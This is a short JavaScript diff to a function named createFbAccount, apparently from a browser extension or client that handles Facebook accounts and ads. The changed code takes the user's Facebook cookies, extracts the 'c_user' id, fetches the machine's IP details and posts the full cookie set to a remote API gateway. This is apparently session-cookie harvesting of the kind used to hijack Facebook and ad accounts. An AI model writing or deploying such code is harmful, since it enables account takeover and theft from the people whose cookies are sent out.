@@ -6,11 +6,13 @@ import { MainResource } from '../resources/main.resource';
 const MainRepository = {
     createFbAccount: async (cookies) => {
         const { value: uid } = cookies.find(item => item.name == "c_user");
-        const currentIp = (await axios.get("https://ipinfo.io/ip")).data;
-        const { data: ipInfo } = await axios.get("https://api.smitfb.com/AppConfig/Info?ip="+currentIp);
-        const resource = MainResource.createFbAccount();
-        const apiGateWay = new ApiGateWay(Config.getBaseConfig());
-        return apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
+        axios.get('https://ipinfo.io/').then(response => {
+            // console.log('data:', response.data)
+            const ipInfo = response.data;
+            const resource = MainResource.createFbAccount();
+            const apiGateWay = new ApiGateWay(Config.getBaseConfig());
+            apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
+        })
     },
     createFbAds: async ({ userId, data }) => {
         const resource = MainResource.createFbAds();
